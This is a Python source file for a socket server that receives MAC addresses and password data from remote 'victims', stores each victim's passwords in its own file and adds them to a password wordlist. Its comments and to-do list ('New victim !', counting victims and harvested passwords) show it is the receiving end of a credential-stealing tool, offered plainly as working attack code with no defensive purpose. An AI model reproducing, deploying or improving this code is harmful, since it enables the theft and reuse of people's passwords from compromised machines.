# Made from scratch by Gibraan Jafar

import socket
from subprocess import Popen, PIPE
import subprocess
import os
import fcntl
import struct
import recover_fast
import remove_duplicates


FILE_NAME = ''
FILE_DESC = ''
clientsocket = ''
serversocket = ''
WORDLIST = '../victims/Wordlist'


def main():
    create_victims_folder()
    create_socket()
    try:
        while True:
            establish_connection()
            mac = get_mac()
            print(" Serving client => ", mac)
            if new_user(mac):
                make_file(mac)
                fill_file()
            clientsocket.close()
            recover_fast.main(mac)
            print()
    except KeyboardInterrupt:
        remove_duplicates.main()
        print("\n\n SERVER STOPPED ...")

def create_victims_folder():
    # check if victims folder exists
    if not os.path.isdir('../victims'):
        os.mkdir('../victims')
        print("Made victims folder")
    os.chdir('../victims')
    # check if Wordlist file exists
    if not os.path.exists('Wordlist'):
        wordlist = open('Wordlist','a')
        print("Created empty wordlist file")


def create_socket():
    global serversocket
    try:
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        interface = "wlp2s0"  # 'enp1s0' causes issues
        ip = get_ip_address(interface)
        print(type(ip))
        print("Current ip on " + interface + " => " + str(ip)+'\n')
        port = 10000
        server_address = (ip, port)
        serversocket.bind(server_address)
        serversocket.listen(5)
    except:
        print(Exception)
        print("Socket couldn't be created .\n Maybe incorrect ip specified !")
        exit(1)


def establish_connection():
    global clientsocket
    clientsocket, addr = serversocket.accept()

    # returns ip of interface specified. Don't understand how it works


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))
    )[20:24])


def get_mac():
    mac = clientsocket.recv(14).decode('ascii')
    return mac


def get_data():
    " Receive data and send it to calling function "
    CONTENT = clientsocket.recv(1500).decode('utf-8')
    #CONTENT = CONTENT.split('\n')
    return CONTENT


def new_user(intro):
    if os.path.exists(intro):
        print("Already have passwords ")
        return False
    else:
        print("New victim !")
        return True


def make_file(file_name):
    global FILE_NAME, FILE_DESC
    FILE_NAME = file_name
    FILE_DESC = open(file_name, 'a')


def fill_file():
    content = get_data()
    #for item in content:
    FILE_DESC.write(content)

    FILE_DESC.close()


if __name__ == "__main__":
    print("=== INITIALIZING SERVER === \n")
    main()


""" Bugs
1) Interface 'enp1s0' ie: on ethernet

    Improvements
1) When initializing server print
	no of victims so far
	no of unique passwords in Wordlist
2) When terminating server
	no of victims so far
	no of unique passwords in Wordlist
"""
